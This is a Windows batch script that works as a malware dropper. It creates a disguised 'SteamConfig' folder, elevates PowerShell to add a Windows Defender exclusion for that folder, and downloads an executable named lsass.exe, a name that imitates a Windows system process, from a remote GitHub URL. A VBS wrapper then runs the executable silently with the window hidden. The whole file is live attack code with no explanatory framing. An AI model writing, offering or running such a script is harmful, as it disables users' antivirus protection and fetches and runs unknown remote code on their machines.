@echo off
setlocal enabledelayedexpansion

:: Set paths
set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
set "batchScript=%TEMP%\hidden_runner.bat"
set "vbsScript=%TEMP%\hidden_runner.vbs"
set "exeFile=%folderPath%\lsass.exe"

:: Create SteamConfig folder if it doesn't exist
if not exist "%folderPath%" mkdir "%folderPath%"

:: Create the batch script that will run hidden
(
    echo @echo off
    echo setlocal enabledelayedexpansion
    echo if not exist "%folderPath%" mkdir "%folderPath%"
    echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
    echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1

    echo :checkFile
    echo timeout /t 2 /nobreak ^>nul
    echo if not exist "%exeFile%" goto checkFile
    echo for %%%%F in ("%exeFile%") do set "filesize=%%%%~zF"
    echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul & goto checkFile)

    :: Run the EXE in the background
    echo start "" "%exeFile%"
    echo exit /b 0
) > "%batchScript%"

:: Create the VBS script to run the batch file silently
(
    echo Set objShell = CreateObject("WScript.Shell")
    echo objShell.Run "cmd.exe /c %batchScript%", 0, False
) > "%vbsScript%"

:: Run the VBS script
cscript //nologo "%vbsScript%"
exit
